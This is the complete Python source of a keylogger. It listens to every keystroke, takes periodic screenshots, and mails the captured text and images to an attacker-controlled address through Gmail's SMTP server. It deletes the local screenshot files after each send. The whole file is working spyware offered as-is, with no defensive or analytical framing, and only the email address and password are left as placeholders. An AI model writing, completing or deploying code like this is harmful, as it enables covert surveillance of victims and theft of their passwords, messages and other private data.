#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import smtplib
import threading
import pynput
import pynput.keyboard
import pyautogui as pg
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.application import MIMEApplication

class Keylogger:
	def __init__(self, time_interval, number, email, password):
		self.i = 0
		self.log = 'Keylogger started'
		self.interval = time_interval
		self.number = number
		self.email = email
		self.password = password

	def append_log(self, string):
		self.log += string
		if len(self.log.split(' ')) >= self.number:
			self.report()

	def process_key_press(self, key):
		try:
			current_key = str(key.char)
		except AttributeError:
			if key == key.space:
				current_key = ' '
			elif key == key.ctrl_l or key == key.ctrl_r:
				current_key = ' Crtl '
			elif key == key.shift or key == key.shift_r:
				current_key = ' Shift '
			elif key == key.alt_l or key == key.alt_gr:
				current_key = ' Alt '
			elif key == key.cmd:
				current_key = ' Cmd '
			else:
				current_key = ' ' + str(key) + ' '
		self.append_log(current_key)

	def report(self):
		i = 1
		self.send_mail(self.email, self.password)
		self.log = ''
		while True:
			try:
				os.remove('screenshot' + str(i) + '.png')
				i += 1
			except FileNotFoundError:
				break
		self.i = 0

	def screenshot(self):
		self.i += 1
		pg.screenshot('screenshot' + str(self.i) + '.png')
		if self.i == 20:
			self.report()
		timer = threading.Timer(self.interval, self.screenshot)
		timer.start()

	def send_mail(self, email, password):
		i = 1
		msg = MIMEMultipart()
		msg['Subject'] = 'Данные'
		body = self.log
		msg.attach(MIMEText(body, 'plain')) 
		while True:
			try:
				part = MIMEApplication(open('screenshot' + str(i) + '.png', 'rb').read())
				part.add_header('Content-Disposition', 'attachment', filename = 'screenshot' + str(i) + '.png')
				msg.attach(part)
				i += 1
			except FileNotFoundError:
				server = smtplib.SMTP('smtp.gmail.com', 587)
				server.starttls()
				server.login(email, password)
				server.sendmail(email, email, msg.as_string())
				server.quit()
				break

	def start(self):
		keyboard = pynput.keyboard.Listener(on_press = self.process_key_press)
		with keyboard:
			self.report()
			self.screenshot()
			keyboard.join()

startlogger = Keylogger(30, 500, 'email', 'password')
startlogger.start()
